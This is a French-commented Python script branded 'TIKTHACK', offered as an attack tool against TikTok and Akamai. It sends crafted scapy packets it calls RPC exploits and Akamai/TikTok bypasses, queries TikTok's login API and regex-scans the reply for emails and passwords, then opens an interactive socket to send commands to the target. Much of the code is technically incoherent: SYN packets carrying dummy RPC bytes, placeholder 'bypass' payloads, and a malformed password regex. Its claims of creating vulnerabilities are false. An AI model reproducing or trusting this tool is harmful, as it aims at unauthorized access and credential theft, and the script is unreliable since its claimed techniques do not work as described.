import socket
import sys
import time
import logging
from urllib.parse import urlparse
from colorama import Fore, Style
import re
from scapy.all import IP, TCP, sr1
import select

# Configuration des logs
logging.basicConfig(filename='script_log.txt', level=logging.DEBUG)

def log_info(message):
    logging.info(message)
    print(message)

def log_error(message):
    logging.error(message)
    print(f"{Fore.RED}[ERROR] {message}{Style.RESET_ALL}")

def get_ip_from_input(input_str):
    try:
        parsed_url = urlparse(input_str)
        if parsed_url.netloc:
            return socket.gethostbyname(parsed_url.netloc)
        else:
            return socket.gethostbyname(input_str)
    except socket.error:
        log_error("[-] Adresse IP ou URL invalide.")
        return None

def get_dynamic_ip(target):
    try:
        return socket.gethostbyname(target)
    except socket.error:
        log_error("[-] Impossible d'obtenir l'adresse IP de la cible.")
        return None

def print_banner():
    banner = f"""
{Fore.GREEN}
/$$$$$$$$ /$$$$$$ /$$   /$$ /$$$$$$$$ /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
|__  $$__/|_  $$_/| $$  /$$/|__  $$__/| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$/
   | $$     | $$  | $$ /$$/    | $$   | $$  | $$| $$  \ $$| $$  \__/| $$ /$$/ 
   | $$     | $$  | $$$$$/     | $$   | $$$$$$$$| $$$$$$$$| $$      | $$$$$/  
   | $$     | $$  | $$  $$     | $$   | $$__  $$| $$__  $$| $$      | $$  $$  
   | $$     | $$  | $$\  $$    | $$   | $$  | $$| $$  | $$| $$    $$| $$\  $$ 
   | $$    /$$$$$$| $$ \  $$   | $$   | $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$
   |__/   |______/|__/  \__/   |__/   |__/  |__/|__/  |__/ \______/ |__/  \__/
                                                                              
                                                                              
                                                                              
    """
    print(banner)

# Expressions régulières
regex_mail = re.compile(r'[a-z0-9._-]+@[a-z0-9._-]+\.[a-z]+')
regex_password = re.compile(r'(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9]){6,10}')

# Ajouter l'URL de l'API TikTok
tiktok_api_url = "https://api16-va.tiktokv.com/passport/user/login?"

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
def create_rpc_vulnerability(target, port):
    target_ip = get_dynamic_ip(target)
    if target_ip is None:
        return False

    try:
        ip = IP(dst=target_ip)

        # Construction d'une requête RPC spécialement conçue
        rpc_request = (
            b"\x80\x00\x00\x00"  # Version
            b"\x00\x00\x00\x01"  # Type (Request)
            b"\x00\x00\x00\x04"  # Body Length
            b"\x00\x00\x00\x01"  # Program ID
            b"\x00\x00\x00\x02"  # Program Version
            b"\x00\x00\x00\x03"  # Procedure
            b"\x00\x00\x00\x00"  # Credential
            b"\x00\x00\x00\x00"  # Verifier
        )

        vulnerable_rpc = TCP(dport=port, flags="S") / rpc_request

        # Utilisation de sr1 avec timeout pour éviter l'erreur 408
        response = sr1(ip / vulnerable_rpc, timeout=2, verbose=0)
        if response is not None and response.haslayer(TCP) and response[TCP].flags & 2:
            log_info("[+] Vulnérabilité RPC intentionnelle créée")
            return True
        else:
            log_error("[-] La création de la vulnérabilité RPC a échoué. Aucune réponse SYN/ACK reçue.")
            return False
    except Exception as e:
        log_error("[-] Échec de la création de la vulnérabilité RPC intentionnelle")
        log_error(f"Erreur : {str(e)}")
        return False


def syn_ack_exploit(target, port):
    target_ip = get_dynamic_ip(target)
    if target_ip is None:
        return False

    try:
        ip = IP(dst=target_ip)
        syn_ack = TCP(dport=port, flags="SA")
        sr1(ip / syn_ack, timeout=1, verbose=0)
        log_info("[+] Exploitation - SYN/ACK forcé envoyé")
        return True
    except Exception as e:
        log_error("[-] Exploitation échouée - Impossible d'envoyer SYN/ACK")
        log_error(f"Erreur : {str(e)}")
        return False

def rpc_exploit(target, port):
    target_ip = get_dynamic_ip(target)
    if target_ip is None:
        return False

    try:
        ip = IP(dst=target_ip)

        # Utilisation de l'appel RPC pour l'exploitation
        rpc_request = (
            b"\x80\x00\x00\x00"  # Version
            b"\x00\x00\x00\x01"  # Type (Request)
            b"\x00\x00\x00\x04"  # Body Length
            b"\x00\x00\x00\x01"  # Program ID
            b"\x00\x00\x00\x02"  # Program Version
            b"\x00\x00\x00\x03"  # Procedure
            b"\x00\x00\x00\x00"  # Credential
            b"\x00\x00\x00\x00"  # Verifier
        )

        rpc_exploit_packet = TCP(dport=port, flags="SA") / rpc_request
        sr1(ip / rpc_exploit_packet, timeout=1, verbose=0)

        log_info("[+] Exploitation RPC - SYN/ACK forcé envoyé avec succès")
        return True
    except Exception as e:
        log_error("[-] Exploitation RPC échouée - Impossible d'envoyer SYN/ACK")
        log_error(f"Erreur : {str(e)}")
        return False

def bypass_akamai(target, port):
    try:
        retry_count = 3

        while retry_count > 0:
            current_ip = get_dynamic_ip(target)

            if current_ip is not None:
                try:
                    # Résolution dynamique de l'adresse IP d'Akamai
                    akamai_ip = socket.gethostbyname("akamai.com")

                    # Utilisez des en-têtes RPC pour le contournement Akamai
                    rpc_request = (
                        b"\x80\x00\x00\x00"  # Version
                        b"\x00\x00\x00\x01"  # Type (Request)
                        b"\x00\x00\x00\x04"  # Body Length
                        b"\x00\x00\x00\x01"  # Program ID
                        b"\x00\x00\x00\x02"  # Program Version
                        b"\x00\x00\x00\x03"  # Procedure
                        b"\x00\x00\x00\x00"  # Credential
                        b"\x00\x00\x00\x00"  # Verifier
                    )

                    ip = IP(dst=current_ip)
                    payload = rpc_request
                    rpc_packet = TCP(dport=port, flags="PA") / payload
                    sr1(ip / rpc_packet, timeout=1, verbose=0)

                    log_info("[+] Contournement Akamai - Requête RPC spécialement conçue envoyée")
                    return True
                except Exception as e:
                    log_error("[!] Contournement Akamai échoué - Impossible d'envoyer la requête RPC spécialement conçue")
                    log_error(f"[!] Erreur : {str(e)}")
                    retry_count -= 1
            else:
                log_error("[-] Impossible d'obtenir l'adresse IP de la cible.")

            time.sleep(5)

    except KeyboardInterrupt:
        log_info("\nBypass interrompu.")
        return False
    except Exception as e:
        log_error(f"[-] Erreur lors du contournement Akamai : {str(e)}")
        return False

def bypass_tiktok_api(target, port):
    try:
        retry_count = 3

        while retry_count > 0:
            current_ip = get_dynamic_ip(target)

            if current_ip is not None:
                try:
                    # Utilisez une requête spéciale pour le contournement TikTok API
                    tiktok_api_request = b"TikTok API Bypass Request"

                    ip = IP(dst=current_ip)
                    payload = tiktok_api_request
                    tiktok_api_packet = TCP(dport=port, flags="PA") / payload
                    sr1(ip / tiktok_api_packet, timeout=1, verbose=0)

                    log_info("[+] Contournement TikTok API - Requête spéciale envoyée")
                    return True
                except Exception as e:
                    log_error("[!] Contournement TikTok API échoué - Impossible d'envoyer la requête spéciale")
                    log_error(f"[!] Erreur : {str(e)}")
                    retry_count -= 1
            else:
                log_error("[-] Impossible d'obtenir l'adresse IP de la cible.")

            time.sleep(5)

    except KeyboardInterrupt:
        log_info("\nBypass interrompu.")
        return False
    except Exception as e:
        log_error(f"[-] Erreur lors du contournement TikTok API : {str(e)}")

def display_remote_logs(target, port, log_file_path="remote_logs.txt"):

    target_ip = get_dynamic_ip(target)

    if target_ip is None:

        return False


    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:

            client_socket.connect((target_ip, port))

            log_info("[+] Connexion établie avec l'hôte distant")


            inputs = [client_socket, sys.stdin]

            outputs = []


            while inputs:

                readable, writable, exceptional = select.select(inputs, outputs, inputs)


                for s in readable:

                    if s is client_socket:

                        log_data = s.recv(4096)

                        if not log_data:

                            inputs.remove(s)

                            break

                        decoded_log_data = log_data.decode('utf-8', errors='ignore')

                        print(decoded_log_data, end='')

                        sys.stdout.flush()

                    elif s is sys.stdin:

                        user_input = input()

                        if not user_input:

                            break

                        client_socket.send(user_input.encode())


            log_info("[+] Connexion fermée")

            return True

    except Exception as e:

        log_error(f"[-] Erreur de connexion à l'hôte distant : {str(e)}")

        return False

def fetch_user_data_from_remote(host, port, output_file_path="user_data_output.txt"):
    try:
        target_ip = get_dynamic_ip(host)
        if target_ip is None:
            return False

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.settimeout(5)
            client_socket.connect((target_ip, port))
            log_info("[+] Connexion établie avec l'hôte distant")

            # Utilisez l'URL de l'API TikTok dans la requête HTTP
            http_request = f"GET {tiktok_api_url} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            client_socket.sendall(http_request.encode())

            user_data = b""
            while True:
                data_chunk = client_socket.recv(4096)
                if not data_chunk:
                    break
                user_data += data_chunk

            if user_data:
                log_info("[+] Réponse brute du serveur :")
                log_info(user_data.decode())

                log_info("[+] Données utilisateur affichées dans le terminal.")

                # Recherche des e-mails dans les données utilisateur
                emails = regex_mail.findall(user_data.decode())
                if emails:
                    log_info("[+] Adresses e-mail trouvées :")
                    for email in emails:
                        log_info(email)
                else:
                    log_info("[+] Aucune adresse e-mail trouvée.")

                # Recherche des mots de passe dans les données utilisateur
                passwords = regex_password.findall(user_data.decode())
                if passwords:
                    log_info("[+] Mots de passe trouvés :")
                    for password in passwords:
                        log_info(password)
                else:
                    log_info("[+] Aucun mot de passe trouvé.")

            else:
                log_info("[+] Aucune donnée utilisateur à afficher.")

            log_info("[+] Connexion fermée")
            return True
    except socket.timeout:
        log_error("[-] Délai dépassé : Impossible de récupérer les données utilisateur. Connexion expirée.")
        return False
    except socket.error as e:
        log_error(f"[-] Erreur de socket : {str(e)}")
        return False
    except Exception as e:
        log_error(f"[-] Erreur : {str(e)}")
        return False

def force_connection_and_interact(target, port):
    try:
        target_ip = get_dynamic_ip(target)
        if target_ip is None:
            return False

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forced_socket:
            forced_socket.connect((target_ip, port))

            # Contournement Akamai
            payload = b"\x01" * 8
            malformed_tcp = TCP(dport=port, flags="RA", sport=65534) / payload
            sr1(IP(dst=target_ip) / malformed_tcp, timeout=1, verbose=0)

            forced_socket.sendall("Bonjour, ceci est une connexion forcée!".encode())

            response = forced_socket.recv(1024)
            log_info("[+] Connexion forcée réussie. Réponse du serveur : {}".format(response.decode()))

            # Interaction avec la remote host
            while True:
                command = input("Entrez une commande à exécuter sur la remote host (ou 'exit' pour quitter) : ")
                if command.lower() == 'exit':
                    break

                forced_socket.sendall(command.encode())
                response = forced_socket.recv(1024)
                log_info("[+] Réponse de la remote host : {}".format(response.decode()))

        log_info("[+] Connexion fermée")
    except Exception as e:
        log_error("[-] Erreur lors de la connexion forcée : {}".format(str(e)))

if __name__ == "__main__":
    try:
        print_banner()

        target_for_vulnerability = input("Entrez l'adresse IP ou l'URL de la cible pour créer la vulnérabilité RPC : ")
        port_for_vulnerability = int(input("Entrez le port pour créer la vulnérabilité RPC : "))

        target_for_exploit = input("Entrez l'adresse IP ou l'URL de la cible pour l'exploitation : ")
        port_for_exploit = int(input("Entrez le port pour l'exploitation : "))

        target_for_exploit_ip = get_dynamic_ip(target_for_exploit)
        if target_for_exploit_ip is not None:
            if create_rpc_vulnerability(target_for_vulnerability, port_for_vulnerability):
                time.sleep(2)
                if syn_ack_exploit(target_for_exploit_ip, port_for_exploit):
                    time.sleep(2)
                    if bypass_akamai(target_for_exploit_ip, port_for_exploit):
                        if bypass_tiktok_api(target_for_exploit_ip, port_for_exploit):
                            display_remote_logs(target_for_exploit_ip, 443)
                            if fetch_user_data_from_remote(target_for_exploit_ip, 443):
                                log_info("[+] Exploitation réussie - Données utilisateur récupérées")
                            else:
                                log_error("[-] Exploitation échouée - Impossible de récupérer les données utilisateur")

                            force_target = input("Voulez-vous forcer la connexion à la cible ? (o/n) : ").lower()
                            if force_target == "o":
                                force_connection_and_interact(target_for_exploit_ip, port_for_exploit)

    except KeyboardInterrupt:
        log_info("\nScript interrompu.")
        sys.exit(0)
